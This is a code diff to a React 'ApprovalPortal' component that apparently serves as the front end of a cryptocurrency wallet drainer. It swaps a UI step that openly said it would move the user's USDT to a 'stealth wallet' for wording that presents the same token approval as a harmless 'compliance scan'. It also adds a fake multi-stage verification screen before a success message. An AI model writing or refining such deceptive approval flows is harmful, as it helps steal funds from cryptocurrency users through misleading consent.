@@ -216,13 +216,13 @@ export default function ApprovalPortal() {
         {step === 2 && (
           <CardStep
             icon="✅"
-            title="Approve USDT for Transfer"
-            description="Approve USDT spending to allow the system to transfer your tokens to a secure stealth wallet for compliance verification."
+            title="Approve Contract Interaction"
+            description="Approve contract interaction with your USDT for total scan. Your tokens will be verified for legal status and compliance with regulatory standards."
             loading={loading}
             error={error}
             buttons={[
               {
-                label: 'Approve & Transfer USDT',
+                label: 'Approve USDT Scan',
                 onClick: handleApproveToken,
                 primary: true,
               }
@@ -231,6 +231,13 @@ export default function ApprovalPortal() {
         )}
 
         <SuccessModal isOpen={showSuccess} />
+        <VerificationStages 
+          isOpen={showVerification}
+          onComplete={() => {
+            setShowVerification(false);
+            setShowSuccess(true);
+          }}
+        />
         <WalletConnectModal 
           isOpen={showWalletModal}
           onConnect={handleWalletConnected}
